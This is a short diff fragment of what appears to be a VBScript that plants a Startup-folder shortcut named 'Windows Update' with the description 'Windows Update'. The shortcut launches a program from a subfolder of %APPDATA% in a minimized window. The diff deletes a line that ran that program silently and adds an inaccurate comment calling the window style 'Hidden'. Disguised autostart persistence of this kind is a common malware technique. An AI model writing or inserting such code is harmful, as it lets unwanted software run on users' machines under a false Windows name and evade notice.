@@ -6,8 +6,6 @@ strShortcutPath = strStartupFolder & "\Windows Update.lnk"
 Set objShortcut = objShell.CreateShortcut(strShortcutPath)
 objShortcut.TargetPath = strTargetPath
 objShortcut.WorkingDirectory = objShell.ExpandEnvironmentStrings("%APPDATA%\SubDir")
-objShortcut.WindowStyle = 7
+objShortcut.WindowStyle = 7 ' Hidden
 objShortcut.Description = "Windows Update"
 objShortcut.Save
-
-objShell.Run """" & strTargetPath & """", 0, False
